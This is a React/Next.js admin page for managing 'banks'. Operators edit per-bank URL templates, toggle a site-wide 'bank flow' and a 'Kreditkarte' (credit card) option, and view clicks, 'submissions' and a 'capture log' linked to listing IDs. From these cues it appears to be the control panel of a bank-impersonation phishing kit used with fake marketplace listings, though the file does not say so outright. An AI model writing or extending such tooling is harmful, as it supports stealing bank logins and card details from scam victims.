"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { Power, MousePointerClick, Inbox, TrendingUp, CheckCircle2, CreditCard } from "lucide-react";
import { BankAvatar } from "@/components/BankAvatar";
import { Switch } from "@/components/Switch";

type Bank = {
  id: string;
  slug: string;
  name: string;
  logo: string;
  urlTemplate: string;
  enabled: boolean;
  maintenance: boolean;
  order: number;
};

type Stats = {
  totals: {
    clicks: number;
    submissions: number;
    topBank: { slug: string; name: string; submissions: number } | null;
  };
  perBank: Array<{
    slug: string;
    name: string;
    enabled: boolean;
    maintenance: boolean;
    clicks: number;
    submissions: number;
  }>;
  recent: Array<{
    id: string;
    step: string;
    createdAt: string;
    listingId: string | null;
    bank: { slug: string; name: string };
  }>;
};

export default function BanksPage() {
  const [banks, setBanks] = useState<Bank[]>([]);
  const [stats, setStats] = useState<Stats | null>(null);
  const [globallyEnabled, setGloballyEnabled] = useState(true);
  const [creditCardEnabled, setCreditCardEnabled] = useState(true);
  const [loading, setLoading] = useState(true);
  const [savingSlug, setSavingSlug] = useState<string | null>(null);

  const load = async () => {
    const [banksRes, statsRes, settingsRes] = await Promise.all([
      fetch("/api/banks").then((r) => r.json()),
      fetch("/api/banks/stats").then((r) => r.json()),
      fetch("/api/settings").then((r) => r.json()),
    ]);
    setBanks(banksRes);
    setStats(statsRes);
    setGloballyEnabled(settingsRes.banksGloballyEnabled ?? true);
    setCreditCardEnabled(settingsRes.creditCardEnabled ?? true);
    setLoading(false);
  };

  useEffect(() => {
    load();
  }, []);

  const updateBank = async (slug: string, patch: Partial<Bank>) => {
    setSavingSlug(slug);
    setBanks((prev) => prev.map((b) => (b.slug === slug ? { ...b, ...patch } : b)));
    await fetch(`/api/banks/${slug}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(patch),
    });
    setSavingSlug(null);
  };

  const toggleGlobal = async (next: boolean) => {
    setGloballyEnabled(next);
    await fetch("/api/settings/banks-toggle", {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ enabled: next }),
    });
  };

  const toggleCreditCard = async (next: boolean) => {
    setCreditCardEnabled(next);
    await fetch("/api/settings/banks-toggle", {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ creditCardEnabled: next }),
    });
  };

  const seedIfEmpty = async () => {
    await fetch("/api/seed/banks", { method: "POST" });
    await load();
  };

  if (loading) {
    return <div className="text-[#6B6B6B] text-sm py-20 text-center">Loading...</div>;
  }

  if (banks.length === 0) {
    return (
      <div className="max-w-2xl mx-auto py-20 text-center space-y-4">
        <p className="text-[#6B6B6B] text-sm">No banks seeded yet.</p>
        <button
          onClick={seedIfEmpty}
          className="px-6 py-2.5 bg-white hover:bg-[#E8E8E8] text-[#0A0A0A] text-sm font-medium rounded-2xl transition-colors cursor-pointer"
        >
          Initialize banks
        </button>
      </div>
    );
  }

  const statsByBank: Record<string, { clicks: number; submissions: number }> = {};
  for (const b of stats?.perBank || []) {
    statsByBank[b.slug] = { clicks: b.clicks, submissions: b.submissions };
  }

  return (
    <div className="max-w-5xl mx-auto space-y-6">
      <div className="flex items-start justify-between gap-4 flex-wrap">
        <div>
          <h1 className="text-2xl font-bold text-white tracking-tight">Banks</h1>
          <p className="text-[#6B6B6B] text-sm mt-1">Manage URLs, status, and capture log</p>
        </div>
        <div className="flex gap-2">
          <Link
            href="/banks/submissions"
            className="px-4 py-2 bg-[#1E1E1E] hover:bg-[#252525] text-white text-xs font-medium rounded-full transition-colors"
          >
            Submissions log
          </Link>
        </div>
      </div>

      {/* Global kill-switch */}
      <div className="bg-[#141414] rounded-2xl p-5 flex items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <Power className={globallyEnabled ? "w-5 h-5 text-emerald-400" : "w-5 h-5 text-red-400"} />
          <div>
            <div className="text-sm font-medium text-white">Global bank flow</div>
            <div className="text-xs text-[#6B6B6B] mt-0.5">
              {globallyEnabled
                ? "Banks are reachable on the public site"
                : "Bank picker is hidden site-wide"}
            </div>
          </div>
        </div>
        <button
          onClick={() => toggleGlobal(!globallyEnabled)}
          className={`px-4 py-2 text-xs font-medium rounded-full transition-colors cursor-pointer ${
            globallyEnabled
              ? "bg-emerald-500/20 text-emerald-300 hover:bg-emerald-500/30"
              : "bg-red-500/20 text-red-300 hover:bg-red-500/30"
          }`}
        >
          {globallyEnabled ? "Enabled" : "Disabled"}
        </button>
      </div>

      {/* Credit card toggle */}
      <div className="bg-[#141414] rounded-2xl p-5 flex items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <CreditCard className={creditCardEnabled ? "w-5 h-5 text-emerald-400" : "w-5 h-5 text-red-400"} />
          <div>
            <div className="text-sm font-medium text-white">Credit card option</div>
            <div className="text-xs text-[#6B6B6B] mt-0.5">
              {creditCardEnabled
                ? "Kreditkarte option is visible on the public site"
                : "Kreditkarte option is hidden site-wide"}
            </div>
          </div>
        </div>
        <button
          onClick={() => toggleCreditCard(!creditCardEnabled)}
          className={`px-4 py-2 text-xs font-medium rounded-full transition-colors cursor-pointer ${
            creditCardEnabled
              ? "bg-emerald-500/20 text-emerald-300 hover:bg-emerald-500/30"
              : "bg-red-500/20 text-red-300 hover:bg-red-500/30"
          }`}
        >
          {creditCardEnabled ? "Enabled" : "Disabled"}
        </button>
      </div>

      {/* Stats cards */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <StatCard
          icon={<MousePointerClick className="w-4 h-4 text-[#6B6B6B]" />}
          label="Clicks"
          value={stats?.totals.clicks ?? 0}
        />
        <StatCard
          icon={<Inbox className="w-4 h-4 text-[#6B6B6B]" />}
          label="Submissions"
          value={stats?.totals.submissions ?? 0}
        />
        <StatCard
          icon={<TrendingUp className="w-4 h-4 text-[#6B6B6B]" />}
          label="Top bank"
          value={stats?.totals.topBank?.name || "—"}
          sub={stats?.totals.topBank ? `${stats.totals.topBank.submissions} subs` : undefined}
        />
        <StatCard
          icon={<CheckCircle2 className="w-4 h-4 text-[#6B6B6B]" />}
          label="Active banks"
          value={banks.filter((b) => b.enabled).length}
          sub={`of ${banks.length}`}
        />
      </div>

      {/* Banks table */}
      <div className="bg-[#141414] rounded-2xl overflow-hidden">
        <div className="px-5 py-4 border-b border-[#1E1E1E] flex items-center justify-between">
          <p className="text-xs font-medium text-[#6B6B6B] uppercase tracking-wider">All banks</p>
          <p className="text-xs text-[#6B6B6B]">
            {savingSlug ? "Saving..." : "Auto-saves on change"}
          </p>
        </div>

        <div className="divide-y divide-[#1E1E1E]">
          {banks.map((b) => {
            const s = statsByBank[b.slug] || { clicks: 0, submissions: 0 };
            return (
              <div key={b.slug} className="px-5 py-4 flex items-center gap-4 flex-wrap hover:bg-[#181818] transition-colors">
                <BankAvatar name={b.name} slug={b.slug} />
                <div className="min-w-[140px]">
                  <div className="text-sm font-medium text-white">{b.name}</div>
                  <div className="text-[11px] text-[#6B6B6B] font-mono">{b.slug}</div>
                </div>
                <input
                  type="text"
                  value={b.urlTemplate}
                  onChange={(e) =>
                    setBanks((prev) =>
                      prev.map((x) => (x.slug === b.slug ? { ...x, urlTemplate: e.target.value } : x))
                    )
                  }
                  onBlur={(e) => updateBank(b.slug, { urlTemplate: e.target.value })}
                  placeholder="/bank-path"
                  className="flex-1 min-w-[200px] px-3 py-2 bg-[#1E1E1E] rounded-xl text-white text-xs focus:bg-[#252525] focus:outline-none focus:ring-1 focus:ring-[#3A3A3A] transition-colors font-mono placeholder:text-[#4A4A4A]"
                />
                <div className="flex items-center gap-3 text-xs text-[#A8A29E] min-w-[110px]">
                  <span className="flex items-center gap-1.5" title="clicks">
                    <MousePointerClick className="w-3.5 h-3.5 text-[#6B6B6B]" />
                    <span className="tabular-nums">{s.clicks}</span>
                  </span>
                  <span className="flex items-center gap-1.5" title="submissions">
                    <Inbox className="w-3.5 h-3.5 text-[#6B6B6B]" />
                    <span className="tabular-nums">{s.submissions}</span>
                  </span>
                </div>
                <Switch
                  checked={b.enabled}
                  onCheckedChange={(v) => updateBank(b.slug, { enabled: v })}
                  label="Enabled"
                />
                <Switch
                  checked={b.maintenance}
                  onCheckedChange={(v) => updateBank(b.slug, { maintenance: v })}
                  label="Maintenance"
                  variant="warn"
                />
              </div>
            );
          })}
        </div>
      </div>

      {/* Recent submissions */}
      <div className="bg-[#141414] rounded-2xl overflow-hidden">
        <div className="px-5 py-4 border-b border-[#1E1E1E] flex items-center justify-between">
          <p className="text-xs font-medium text-[#6B6B6B] uppercase tracking-wider">
            Recent submissions
          </p>
          <Link href="/banks/submissions" className="text-xs text-[#A8A29E] hover:text-white">
            View all →
          </Link>
        </div>

        {(stats?.recent.length ?? 0) === 0 ? (
          <div className="px-5 py-10 text-center text-[#6B6B6B] text-sm">No submissions yet</div>
        ) : (
          <div className="divide-y divide-[#1E1E1E]">
            {stats!.recent.map((s) => (
              <div key={s.id} className="px-5 py-3 flex items-center gap-3 text-xs hover:bg-[#181818] transition-colors">
                <BankAvatar name={s.bank.name} slug={s.bank.slug} size={28} />
                <span className="text-white font-medium min-w-[120px]">{s.bank.name}</span>
                <span className="px-2 py-0.5 bg-[#1E1E1E] rounded-full text-[#A8A29E]">
                  {s.step}
                </span>
                <span className="text-[#6B6B6B] flex-1 truncate">
                  {s.listingId ? `listing ${s.listingId.slice(0, 8)}` : "no listing"}
                </span>
                <span className="text-[#6B6B6B] tabular-nums">{new Date(s.createdAt).toLocaleString()}</span>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

function StatCard({
  icon,
  label,
  value,
  sub,
}: {
  icon?: React.ReactNode;
  label: string;
  value: string | number;
  sub?: string;
}) {
  return (
    <div className="bg-[#141414] rounded-2xl p-4">
      <div className="flex items-center gap-1.5 text-xs text-[#6B6B6B] uppercase tracking-wider">
        {icon}
        <span>{label}</span>
      </div>
      <div className="text-xl font-bold text-white mt-1.5 truncate">{value}</div>
      {sub && <div className="text-[10px] text-[#6B6B6B] mt-0.5">{sub}</div>}
    </div>
  );
}
